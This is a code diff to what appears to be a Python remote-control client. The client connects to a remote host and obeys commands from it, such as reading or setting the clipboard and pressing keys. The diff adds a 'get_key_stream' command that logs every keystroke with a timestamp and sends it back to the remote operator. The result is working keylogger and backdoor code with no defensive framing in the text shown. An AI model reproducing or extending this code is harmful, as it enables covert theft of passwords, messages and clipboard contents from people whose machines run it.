@@ -6,6 +6,8 @@ import sys, os
 import shutil
 import subprocess
 import re, time
+from datetime import datetime
+from pynput.keyboard import Key, Listener
 
 try:
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -50,19 +52,38 @@ def press_key(key):
             keyboard.press_and_release(key)
         conn.send(f"{brackets} Pressed key chain {keys}".encode())
 
+receive = True
+
 while True:
-    key = conn.recv(3024).decode()
-    if key == 'pexit':
-        conn.send(f"\n{brackets} Connection Closed.\n".encode())
-        conn.close()
-        exit()
-    elif key == 'clipboard_data':
-        data = get_clipboard_data()
-        conn.send(f"\n{brackets} Clipboard: {data}\n".encode())
-    elif key.startswith('copy'):
-        text_to_copy = key.split("~~~")[-1]
-        set_clipboard_data(text_to_copy)
-        conn.send(f"{brackets} Copied {text_to_copy}!!".encode())
+    if receive:
+        key = conn.recv(3024).decode()
+        if key == 'pexit':
+            conn.send(f"\n{brackets} Connection Closed.\n".encode())
+            conn.close()
+            exit()
+        elif key == 'clipboard_data':
+            data = get_clipboard_data()
+            conn.send(f"\n{brackets} Clipboard: {data}\n".encode())
+        elif key.startswith('copy'):
+            text_to_copy = key.split("~~~")[-1]
+            set_clipboard_data(text_to_copy)
+            conn.send(f"{brackets} Copied {text_to_copy}!!".encode())
+        elif key == "get_key_stream":
+            receive = False
+            def on_press(key):
+                if key == Key.esc:
+                    return False
+                current_time = datetime.now().strftime("%d/%m//%Y, %H:%M:%S")
+                conn.send(f"{brackets} Pressed '{key}' ({current_time})".encode())
+
+            with Listener(on_press=on_press) as listener:
+                listener.join()
+            # while True:
+            #     presses_key = keyboard.read_key()
+            #     current_time = datetime.now().strftime("%d/%m//%Y, %H:%M:%S")
+            #     conn.send(f"{brackets} Pressed '{presses_key}' ({current_time})".encode())
+            #     time.sleep(0.01)
+
 
     else:
         if "{{" in key and "}}" in key:
